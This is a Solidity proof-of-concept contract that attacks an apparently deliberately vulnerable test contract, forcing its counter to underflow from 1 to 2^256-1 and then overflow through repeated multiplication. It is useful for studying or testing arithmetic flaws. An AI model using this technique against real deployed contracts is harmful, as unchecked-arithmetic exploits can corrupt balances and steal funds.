pragma solidity ^0.4.23;

interface IVulnerable {
    function underflowtostate(uint256 input) external;
    function overflowmultostate(uint256 input) external;
    function count() external view returns (uint256);
}

contract ExploitIntegerOverflow {
    IVulnerable public target;

    constructor(address _target) public {
        target = IVulnerable(_target);
    }

    function exploit() public {
        // Step 1: Underflow count from 1 to 2^256 - 1
        target.underflowtostate(2);

        // Step 2: Multiply to overflow again (irrelevant here, just emphasizes lack of checks)
        target.overflowmultostate(2);

        // Step 3 (Optional): Repeated calls to show manipulation
        for (uint i = 0; i < 5; i++) {
            target.overflowmultostate(2);
        }
    }

    function getCount() public view returns (uint256) {
        return target.count();
    }
}

